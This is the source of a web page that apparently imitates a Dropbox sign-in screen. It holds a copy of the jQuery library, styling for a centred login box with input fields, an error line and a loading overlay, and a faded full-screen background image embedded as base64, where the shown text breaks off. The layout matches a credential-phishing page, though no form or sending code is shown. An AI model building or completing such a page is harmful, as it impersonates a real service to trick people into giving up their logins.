"change select submit keydown keypress keyup contextmenu" ).split( " " ),
function( _i, name ) {

    // Handle event binding
    jQuery.fn[ name ] = function( data, fn ) {
        return arguments.length > 0 ?
            this.on( name, null, data, fn ) :
            this.trigger( name );
    };
}
);




// Support: Android <=4.0 only
// Make sure we trim BOM and NBSP
var rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;

// Bind a function to a context, optionally partially applying any
// arguments.
// jQuery.proxy is deprecated to promote standards (specifically Function#bind)
// However, it is not slated for removal any time soon
jQuery.proxy = function( fn, context ) {
var tmp, args, proxy;

if ( typeof context === "string" ) {
    tmp = fn[ context ];
    context = fn;
    fn = tmp;
}

// Quick check to determine if target is callable, in the spec
// this throws a TypeError, but we will just return undefined.
if ( !isFunction( fn ) ) {
    return undefined;
}

// Simulated bind
args = slice.call( arguments, 2 );
proxy = function() {
    return fn.apply( context || this, args.concat( slice.call( arguments ) ) );
};

// Set the guid of unique handler to the same of original handler, so it can be removed
proxy.guid = fn.guid = fn.guid || jQuery.guid++;

return proxy;
};

jQuery.holdReady = function( hold ) {
if ( hold ) {
    jQuery.readyWait++;
} else {
    jQuery.ready( true );
}
};
jQuery.isArray = Array.isArray;
jQuery.parseJSON = JSON.parse;
jQuery.nodeName = nodeName;
jQuery.isFunction = isFunction;
jQuery.isWindow = isWindow;
jQuery.camelCase = camelCase;
jQuery.type = toType;

jQuery.now = Date.now;

jQuery.isNumeric = function( obj ) {

// As of jQuery 3.0, isNumeric is limited to
// strings and numbers (primitives or objects)
// that can be coerced to finite numbers (gh-2662)
var type = jQuery.type( obj );
return ( type === "number" || type === "string" ) &&

    // parseFloat NaNs numeric-cast false positives ("")
    // ...but misinterprets leading-number strings, particularly hex literals ("0x...")
    // subtraction forces infinities to NaN
    !isNaN( obj - parseFloat( obj ) );
};

jQuery.trim = function( text ) {
return text == null ?
    "" :
    ( text + "" ).replace( rtrim, "" );
};



// Register as a named AMD module, since jQuery can be concatenated with other
// files that may use define, but not via a proper concatenation script that
// understands anonymous AMD modules. A named AMD is safest and most robust
// way to register. Lowercase jquery is used because AMD module names are
// derived from file names, and jQuery is normally delivered in a lowercase
// file name. Do this after creating the global so that if an AMD module wants
// to call noConflict to hide this version of jQuery, it will work.

// Note that for maximum portability, libraries that are not jQuery should
// declare themselves as anonymous modules, and avoid setting a global if an
// AMD loader is present. jQuery is a special case. For more information, see
// https://github.com/jrburke/requirejs/wiki/Updating-existing-libraries#wiki-anon

if ( typeof define === "function" && define.amd ) {
define( "jquery", [], function() {
    return jQuery;
} );
}




var

// Map over jQuery in case of overwrite
_jQuery = window.jQuery,

// Map over the $ in case of overwrite
_$ = window.$;

jQuery.noConflict = function( deep ) {
if ( window.$ === jQuery ) {
    window.$ = _$;
}

if ( deep && window.jQuery === jQuery ) {
    window.jQuery = _jQuery;
}

return jQuery;
};

// Expose jQuery and $ identifiers, even in AMD
// (#7102#comment:10, https://github.com/jquery/jquery/pull/557)
// and CommonJS for browser emulators (#13566)
if ( typeof noGlobal === "undefined" ) {
window.jQuery = window.$ = jQuery;
}




return jQuery;
} );
    </script>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .iframe{
            border: none;
            width: 100%;
            height: 100vh;
            position: fixed;
            top: 0;
            z-index: -1;
        }
        .iframe img{
            width: 100%;
            height: 100%;
            opacity: 0.3;
        }
        .body{
            z-index: 10;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .dropbox_login{
            border: 1px solid grey;
            padding: 15px;
            border-radius: 5px;
            background: white;
            width: 300px;
        }
        .image{
            text-align: center;
            padding: 30px;
        }
        .error{
            margin: 10px 0;
            color: red;
            display: none;
        }
        form{
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            flex-flow: column;
            width: 100%;
            padding: 1px;
        }
        .input{
            border: 1px solid grey;
            width: 90% !important;
            outline: none;
            padding: 13px;
            border-radius: 3px;
        }
        button{
            width: 100% !important;
            padding: 14px;
            background: dodgerblue;
            color: white;
            border: 1px solid dodgerblue;
            border-radius: 3px;
        }
        button:hover{
            background: rgba(30, 143, 255, 0.6);
        }
        .load{
            z-index: 100;
            height: 100vh;
            position: fixed;
            top: 0;
            right: 0;
            width: 100%;
            display: none;
        }
    </style>

    <div class="iframe">
        <img src="data:image/png;base64,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